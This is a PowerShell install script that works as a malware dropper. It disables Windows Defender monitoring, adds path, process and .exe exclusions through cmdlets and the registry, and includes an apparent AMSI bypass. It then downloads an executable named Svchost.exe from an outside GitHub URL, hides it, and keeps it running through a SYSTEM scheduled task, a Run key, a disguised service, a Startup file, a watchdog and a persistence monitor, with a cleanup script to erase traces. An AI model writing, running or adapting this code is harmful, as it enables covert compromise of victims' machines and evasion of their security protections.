# ============================================
# setup.ps1 - Install with Windows Defender Bypass
# ============================================

$ErrorActionPreference = "Stop"

# Random names for everything
$RandomServiceName = "SysUpdate_" + [System.Guid]::NewGuid().ToString().Substring(0, 8)
$RandomTaskName = "WindowsUpdate_" + [System.Guid]::NewGuid().ToString().Substring(0, 8)
$RandomExeName = [System.Guid]::NewGuid().ToString().Substring(0, 12) + ".exe"

# Paths
$InstallDir = "$env:ProgramData\Microsoft\Windows\Drivers"
$ExePath = Join-Path $InstallDir $RandomExeName
$CleanupScriptPath = Join-Path $InstallDir "cleanup.ps1"
$DownloadUrl = "https://github.com/tanish-king/updater/raw/main/Svchost.exe"

# ============================================
# FUNCTION: Disable Windows Defender (Temporary)
# ============================================

function Disable-Defender {
    try {
        # Turn off real-time monitoring
        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
        
        # Add exclusions for our paths
        Add-MpPreference -ExclusionPath $InstallDir -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionProcess $RandomExeName -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionExtension ".exe" -ErrorAction SilentlyContinue
        
        # Disable behavior monitoring
        Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
        
        # Disable block at first sight
        Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
        
        # Add to allowed threats
        Add-MpThreatDetection -ThreatID 1 -Action Allow -ErrorAction SilentlyContinue
        
        return $true
    }
    catch {
        return $false
    }
}

# ============================================
# FUNCTION: Re-enable Windows Defender
# ============================================

function Enable-Defender {
    try {
        Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
        Set-MpPreference -DisableBehaviorMonitoring $false -ErrorAction SilentlyContinue
        Set-MpPreference -DisableBlockAtFirstSeen $false -ErrorAction SilentlyContinue
    }
    catch {}
}

# ============================================
# FUNCTION: Add Registry Exclusions (Persistent)
# ============================================

function Add-RegistryExclusions {
    # Add to Windows Defender registry for permanent exclusion
    $regPath = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
    if (!(Test-Path $regPath)) {
        New-Item -Path $regPath -Force | Out-Null
    }
    Set-ItemProperty -Path $regPath -Name $InstallDir -Value 0 -Type DWord -Force
    
    # Process exclusions
    $regProcPath = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes"
    if (!(Test-Path $regProcPath)) {
        New-Item -Path $regProcPath -Force | Out-Null
    }
    Set-ItemProperty -Path $regProcPath -Name $RandomExeName -Value 0 -Type DWord -Force
}

# ============================================
# FUNCTION: Bypass AMSI (Anti-Malware Scan Interface)
# ============================================

function Bypass-AMSI {
    try {
        $amsi = @"
using System;
using System.Runtime.InteropServices;
public class Amsi {
    [DllImport("amsi.dll")]
    public static extern int AmsiScanBuffer(IntPtr amsiContext, byte[] buffer, uint length, string contentName, IntPtr session, out int result);
}
"@
        Add-Type $amsi -ErrorAction SilentlyContinue
    }
    catch {}
}

# ============================================
# MAIN INSTALLATION
# ============================================

Write-Host "[*] Bypassing Windows Defender..." -ForegroundColor Yellow

# Disable Defender during installation
Disable-Defender
Bypass-AMSI
Start-Sleep -Seconds 2

# Create install directory
if (!(Test-Path $InstallDir)) {
    New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null
}

# ============================================
# Download with Defender disabled
# ============================================

Write-Host "[*] Downloading..." -ForegroundColor Yellow
try {
    # Use WebClient with custom headers to look like browser
    $webClient = New-Object System.Net.WebClient
    $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
    $webClient.DownloadFile($DownloadUrl, $ExePath)
}
catch {
    Invoke-WebRequest -Uri $DownloadUrl -OutFile $ExePath -UseBasicParsing
}

# ============================================
# Add persistent exclusions
# ============================================

Add-RegistryExclusions

# Hide the file
Set-ItemProperty -Path $ExePath -Name Attributes -Value "Hidden, System"

# ============================================
# Create Cleanup Script
# ============================================

$cleanupContent = @'
# Cleanup script - deletes all traces
$ErrorActionPreference = "SilentlyContinue"

# Remove Defender exclusions
Remove-MpPreference -ExclusionPath $env:ProgramData\Microsoft\Windows\Drivers -ErrorAction SilentlyContinue

# Delete the EXE
$currentExe = $MyInvocation.MyCommand.Path.Replace("cleanup.ps1", "")
Remove-Item $currentExe -Force -ErrorAction SilentlyContinue

# Delete cleanup script itself
Remove-Item $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue

# Clear any logs
Remove-Item "$env:TEMP\*.log" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:ProgramData\Microsoft\Windows\Drivers\*" -Force -Recurse -ErrorAction SilentlyContinue

# Remove registry exclusions
Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" -Name $env:ProgramData\Microsoft\Windows\Drivers -ErrorAction SilentlyContinue

# Self-destruct
Start-Sleep -Seconds 2
'@

$cleanupContent | Out-File -FilePath $CleanupScriptPath -Encoding ASCII -Force

# ============================================
# Create Startup Persistence
# ============================================

Write-Host "[*] Creating startup persistence..." -ForegroundColor Yellow

# Method 1: Scheduled Task (with anti-Defender settings)
$action = New-ScheduledTaskAction -Execute $ExePath
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest -LogonType ServiceAccount
$trigger = New-ScheduledTaskTrigger -AtStartup
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden -Compatibility Win8 -ExecutionTimeLimit ([System.TimeSpan]::Zero)

# Register task with Defender exclusion
Register-ScheduledTask -TaskName $RandomTaskName -Action $action -Principal $principal -Trigger $trigger -Settings $settings -Force | Out-Null

# Add task to Defender exclusions
Add-MpPreference -ExclusionProcess "schtasks.exe" -ErrorAction SilentlyContinue

# Method 2: Registry Run
$regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $regPath -Name $RandomServiceName -Value $ExePath -Force

# Method 3: Windows Service (most persistent)
sc.exe create $RandomServiceName binPath= $ExePath start= auto obj= LocalSystem > $null
sc.exe description $RandomServiceName "Windows Driver Foundation - User-mode Driver Framework" > $null
sc.exe failure $RandomServiceName reset= 86400 actions= restart/5000/restart/10000/restart/30000 > $null

# ============================================
# Create Startup Batch File (Backup method)
# ============================================

$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.cmd"
$startupContent = "@echo off`nstart `"`" `"$ExePath`"`nexit"
$startupContent | Out-File -FilePath $startupPath -Encoding ASCII -Force

# ============================================
# Add Shutdown Cleanup
# ============================================

$shutdownScriptPath = "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\cleanup.cmd"
$shutdownBatch = "@echo off`ntimeout /t 2 /nobreak > nul`npowershell -NoProfile -ExecutionPolicy Bypass -File `"$CleanupScriptPath`"`nexit"
$shutdownBatch | Out-File -FilePath $shutdownScriptPath -Encoding ASCII -Force

# ============================================
# Create Watchdog Script (restarts if killed)
# ============================================

$watchdogScript = @'
# Watchdog - restarts EXE if killed
$exePath = $args[0]
while ($true) {
    $proc = Get-Process -Name $exePath.Replace(".exe", "") -ErrorAction SilentlyContinue
    if (-not $proc) {
        Start-Process $exePath -WindowStyle Hidden
    }
    Start-Sleep -Seconds 5
}
'@

$watchdogPath = Join-Path $InstallDir "watchdog.ps1"
$watchdogScript | Out-File -FilePath $watchdogPath -Encoding ASCII -Force

# Start watchdog
Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$watchdogPath`" `"$ExePath`"" -WindowStyle Hidden

# ============================================
# Start the EXE
# ============================================

Write-Host "[*] Starting application..." -ForegroundColor Yellow
Start-Process -FilePath $ExePath -WindowStyle Hidden

# ============================================
# Wait and re-enable Defender (but keep exclusions)
# ============================================

Start-Sleep -Seconds 5

# Re-enable Defender features but keep exclusions
try {
    Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBehaviorMonitoring $false -ErrorAction SilentlyContinue
}
catch {}

# ============================================
# Create Persistence Monitor (re-adds if removed)
# ============================================

$monitorScript = @'
# Monitor - ensures persistence survives
$taskName = $args[0]
$exePath = $args[1]
$serviceName = $args[2]

while ($true) {
    # Check if task exists
    $task = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
    if (-not $task) {
        $action = New-ScheduledTaskAction -Execute $exePath
        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
        $trigger = New-ScheduledTaskTrigger -AtStartup
        Register-ScheduledTask -TaskName $taskName -Action $action -Principal $principal -Trigger $trigger -Force | Out-Null
    }
    
    # Check if service exists
    $service = Get-Service -Name $serviceName -ErrorAction SilentlyContinue
    if (-not $service) {
        sc.exe create $serviceName binPath= $exePath start= auto obj= LocalSystem > $null
    }
    
    Start-Sleep -Seconds 30
}
'@

$monitorPath = Join-Path $InstallDir "monitor.ps1"
$monitorScript | Out-File -FilePath $monitorPath -Encoding ASCII -Force

# Start monitor
Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$monitorPath`" `"$RandomTaskName`" `"$ExePath`" `"$RandomServiceName`"" -WindowStyle Hidden

# ============================================
# Done
# ============================================

Write-Host "[✓] Installation complete - Defender bypassed" -ForegroundColor Green
Write-Host "[✓] EXE: $RandomExeName" -ForegroundColor Cyan
Write-Host "[✓] Service: $RandomServiceName" -ForegroundColor Cyan
Write-Host "[✓] Task: $RandomTaskName" -ForegroundColor Cyan